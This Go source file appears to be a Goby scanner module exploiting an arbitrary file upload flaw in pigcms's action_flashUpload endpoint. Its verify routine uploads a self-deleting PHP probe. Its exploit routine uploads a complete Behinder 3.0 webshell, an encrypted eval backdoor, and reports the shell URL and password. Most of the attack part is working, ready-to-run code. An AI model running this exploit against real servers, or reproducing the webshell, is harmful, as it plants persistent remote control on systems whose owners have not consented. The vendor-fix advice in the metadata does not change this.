package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "pigcms action_flashUpload File Upload",
    "Description": "<p>pigcms is a management system designed to provide customers with WeChat marketing.</p><p>There is an arbitrary file upload vulnerability in the action_flashUpload function of the  pigcms system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
    "Impact": "pigcms action_flashUpload File Upload",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "pigcms",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "小猪 cms 系统 action_flashUpload 存在任意文件上传漏洞",
            "Description": "<p>小猪cms是一款专为客户提供微信营销的管理系统。</p><p>小猪cms系统action_flashUpload函数存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Impact": "<p>小猪cms系统action_flashUpload函数存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "小猪cms",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "pigcms action_flashUpload File Upload",
            "Description": "<p>pigcms is a management system designed to provide customers with WeChat marketing.</p><p>There is an arbitrary file upload vulnerability in the action_flashUpload function of the  pigcms system. Attackers can upload malicious Trojan horses to control server permissions.</p>",
            "Impact": "pigcms action_flashUpload File Upload",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.pigcms.com\">https://www.pigcms.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "pigcms",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "header=\"PigCms.com\" || banner=\"PigCms.com\"",
    "GobyQuery": "header=\"PigCms.com\" || banner=\"PigCms.com\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.pigcms.com/",
    "DisclosureDate": "2021-11-15",
    "References": [
        "https://xz.aliyun.com/t/10470"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "pigcms"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10237"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV")
			cfg1.Data = "------WebKitFormBoundaryxtxB7nI0mjqg3VoV\r\nContent-Disposition: form-data; name=\"filePath\"; filename=\"1.php\"\r\nContent-Type: video/x-flv\r\n\r\n<?php echo md5(233);unlink(__FILE__);?>\r\n------WebKitFormBoundaryxtxB7nI0mjqg3VoV"
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				FileName := regexp.MustCompile("MAIN_URL_ROOT(.*?).php").FindStringSubmatch(resp1.RawBody)
				uri2 := "/cms" + FileName[1] + ".php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				uri1 := "/cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryxtxB7nI0mjqg3VoV")
				cfg1.Data = "------WebKitFormBoundaryxtxB7nI0mjqg3VoV\r\nContent-Disposition: form-data; name=\"filePath\"; filename=\"1.php\"\r\nContent-Type: video/x-flv\r\n\r\n<?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; \n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\r\n------WebKitFormBoundaryxtxB7nI0mjqg3VoV"
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
					FileName := regexp.MustCompile("MAIN_URL_ROOT(.*?).php").FindStringSubmatch(resp1.RawBody)
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/cms" + FileName[1] + ".php\n"
					expResult.Output += "Password：rebeyond\n"
					expResult.Output += "Webshell tool: Behinder v3.0"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
